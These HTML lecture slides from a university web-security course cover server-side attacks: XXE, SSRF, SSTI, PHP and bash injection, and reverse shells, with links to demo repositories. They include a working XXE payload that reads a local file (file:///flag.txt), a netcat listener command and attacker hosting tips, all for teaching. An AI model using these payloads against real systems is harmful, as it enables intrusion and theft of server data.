<!doctype html><html lang=en><head><meta charset=utf-8><title>5: serverside</title>
<meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><link rel=stylesheet href=../reveal-js/css/reset.css><link rel=stylesheet href=../reveal-js/css/reveal.css><link rel=stylesheet href=../reveal-js/css/theme/black.css id=theme><link rel=stylesheet href=../highlight-js/default.min.css></head><body><div class=reveal><div class=slides><section><h2 id=well-get-started-at-16805>We&rsquo;ll get started at 1[68]:05</h2></section><section data-noprocess data-shortcode-slide class=center><h1 id=more-server-side>more server-side</h1><h3 id=68443-week5>6[84]43 week5</h3></section><section><h1 id=house-cleaning>House cleaning</h1><section data-shortcode-section><h2 id=report-groups>Report groups</h2><blockquote><p>If you aren&rsquo;t in a group please let me know</p></blockquote></section><section><h2 id=midterm>Midterm</h2><blockquote><p>How&rsquo;d you all find it (trivial enough?)</p></blockquote></section></section><section><h1 id=lecture-content>Lecture content</h1><ul><li>LFI</li><li>File disclosure (path traversal)</li><li>XXE</li><li>SSRF</li></ul></section><section><h2 id=xxe>XXE</h2><section data-shortcode-section><h3 id=xml-external-entities>XML External Entities</h3><ul><li>DTD - Document Type Definition</li><li>Internal Entity: an entity declared within the DTD (like a variable)</li><li>External Entity: an entity declared outside the DTD (files, stuff on other websites)</li></ul></section><section><h3 id=internal-entities>Internal entities</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ENTITY string &#34;hey, don&#39;t read my diary&#34; &gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;diary&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;entry&gt;</span>&amp;string;<span style=color:#f92672>&lt;/entry&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/diary&gt;</span>
</span></span></code></pre></div><p> </p><p>prints</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>hey, don&#39;t read my diary
</span></span></code></pre></div></section><section><h3 id=external-entities>External entities</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ENTITY funCatFact &#34;https://FunCatFact.com/generate&#34; &gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;diary&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;entry&gt;</span>&amp;funCatFact;<span style=color:#f92672>&lt;/entry&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/diary&gt;</span>
</span></span></code></pre></div><p> </p><p>prints</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>Cats are asleep for 70% of their lives.
</span></span></code></pre></div></section><section><h3 id=lfi--ssi>LFI / SSI</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ENTITY flag SYSTEM &#34;file:///flag.txt&#34; &gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;diary&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;entry&gt;</span>&amp;flag;<span style=color:#f92672>&lt;/entry&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/diary&gt;</span>
</span></span></code></pre></div><p> </p><p>prints</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>COMP6443{....}
</span></span></code></pre></div></section><section><h3 id=parameterised-entities>Parameterised entities</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ENTITY % difficulty &#34;trivial&#34; &gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ENTITY % meme &#34;web apps is %difficulty;&#34; &gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;diary&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;entry&gt;</span>%meme;<span style=color:#f92672>&lt;/entry&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/diary&gt;</span>
</span></span></code></pre></div><p> </p><p>prints</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>web apps is trivial
</span></span></code></pre></div></section><section><h3 id=how-to-host-content>How to host content</h3><ul><li><code>python3 -m http.server + NGROK</code></li><li><code>RequestBin</code></li><li><code>GitHub pages</code> (needs to build everytime though so it&rsquo;s slow)</li></ul></section></section><section><h2 id=ssrf>SSRF</h2><section data-shortcode-section><h3 id=server-side-request-forgery>Server-side request forgery</h3><ul><li>Trick a server into doing stuff it doesn&rsquo;t intend to</li><li>Consider <code>HAAS</code>, we can&rsquo;t access <code>KB</code>, but <code>HAAS</code> could, and we can send requests through <code>HAAS</code></li><li>What if we could access other internal services through <code>HAAS</code>, which aren&rsquo;t expecting it</li></ul></section><section><h3 id=exploitation>Exploitation</h3><ul><li>Internal services might (often will) be less secure than externally facing ones</li><li>What can we do?<ul><li>Retrieve/disclose information (ssi/lfi)</li><li>Remote code execution / Reverse shells?</li><li>Other bad stuff</li></ul></li></ul></section><section><h2 id=demohttpsgithubcomlachlan-waugh6443treemaindemosserver-side-injectionssrf><a href=https://github.com/lachlan-waugh/6443/tree/main/demos/server-side-injection/ssrf>Demo</a></h2></section><section><h3 id=remediation>Remediation</h3><ul><li>Don&rsquo;t assume local/internal services will be safe</li><li>Monitor internal requests, block any suspicious activity<ul><li>e.g. very long execution time could be someone fetchng information from a database</li></ul></li><li>A whitelist of IPs that can access internal services</li><li>A <em>good</em> WAF</li></ul></section></section><section><h2 id=ssti>SSTI</h2><section data-shortcode-section><h3 id=server-side-template-injection>Server-side template injection</h3><ul><li><p>Templating engines (eg. Jinja2, Pug) use templates to inject code and variables into static files</p></li><li><p>Jinja2: <code>{{</code>&lt;CODE HERE><code>}}</code> e.g. <code>{{7*7}}</code> => <code>49</code></p></li><li><p><em>what if we tricked the template rendering into thinking our user-supplied content was code?</em></p></li></ul></section><section><h2 id=demohttpsgithubcomlachlan-waugh6443treemaindemosserver-side-injectionssti><a href=https://github.com/lachlan-waugh/6443/tree/main/demos/server-side-injection/ssti>Demo</a></h2></section><section></section></section><section><h2 id=basic-php-injection>Basic PHP injection</h2><section data-shortcode-section><ul><li>PHP is the worst language in the world</li><li>Kris kinda went through in the tute, thought I&rsquo;d just show what you could get with it though</li></ul></section><section><h2 id=demohttpsgithubcomlachlan-waugh6443treemaindemosserver-side-injectionphp_webshell><a href=https://github.com/lachlan-waugh/6443/tree/main/demos/server-side-injection/php_webshell>Demo</a></h2></section></section><section><section data-shortcode-section><h2 id=bash-injection>bash injection</h2><ul><li>If you&rsquo;re ever using os.system() (or similar) to call shell functions containing user input<ul><li>first of all, probably don&rsquo;t</li><li>second of all, it&rsquo;s kinda vulnerable</li></ul></li></ul></section><section><h2 id=demohttpsgithubcomlachlan-waugh6443treemaindemosserver-side-injectionshell_injection><a href=https://github.com/lachlan-waugh/6443/tree/main/demos/server-side-injection/shell_injection>Demo</a></h2></section><section><h2 id=reverse-shells>reverse shells</h2><ul><li>Sometimes you can get command injection, but it&rsquo;s really tedious</li><li>wouldn&rsquo;t it be easier if you could just get send your commands directly via terminal?</li></ul><blockquote><p>checkout <a href="https://www.explainshell.com/explain?cmd=nc+-lnvp+9999">explainshell</a> and <a href=https://revshells.com>revshells</a></p></blockquote></section><section><h2 id=demohttpsgithubcomlachlan-waugh6443treemaindemosserver-side-injectionrevshell><a href=https://github.com/lachlan-waugh/6443/tree/main/demos/server-side-injection/revshell>Demo</a></h2></section><section></section></section><section><h1 id=presentations>Presentations</h1><ul><li>ten minute presentation on something cool security related from the last week?</li><li>for bonus marks??</li></ul></section><section><h2 id=now-do-some-challenges>Now do some challenges</h2><blockquote><p>What you all came for lol</p></blockquote></section></div></div><script type=text/javascript src=../reveal-hugo/object-assign.js></script><a href=../reveal-js/css/print/ id=print-location style=display:none></a><script type=text/javascript>var printLocationElement=document.getElementById("print-location"),link=document.createElement("link");link.rel="stylesheet",link.type="text/css",link.href=printLocationElement.href+(window.location.search.match(/print-pdf/gi)?"pdf.css":"paper.css"),document.getElementsByTagName("head")[0].appendChild(link)</script><script type=application/json id=reveal-hugo-site-params>null</script><script type=application/json id=reveal-hugo-page-params>null</script><script src=../reveal-js/js/reveal.js></script><script type=text/javascript>function camelize(e){return e&&Object.keys(e).forEach(function(t){newK=t.replace(/(_\w)/g,function(e){return e[1].toUpperCase()}),newK!=t&&(e[newK]=e[t],delete e[t])}),e}var revealHugoDefaults={center:!0,controls:!0,history:!0,progress:!0,transition:"slide"},revealHugoSiteParams=JSON.parse(document.getElementById("reveal-hugo-site-params").innerHTML),revealHugoPageParams=JSON.parse(document.getElementById("reveal-hugo-page-params").innerHTML),options=Object.assign({},camelize(revealHugoDefaults),camelize(revealHugoSiteParams),camelize(revealHugoPageParams));Reveal.initialize(options)</script><script type=text/javascript src=../reveal-js/plugin/markdown/marked.js></script><script type=text/javascript src=../reveal-js/plugin/markdown/markdown.js></script><script type=text/javascript src=../reveal-js/plugin/highlight/highlight.js></script><script type=text/javascript src=../reveal-js/plugin/zoom-js/zoom.js></script><script type=text/javascript src=../reveal-js/plugin/notes/notes.js></script></body></html>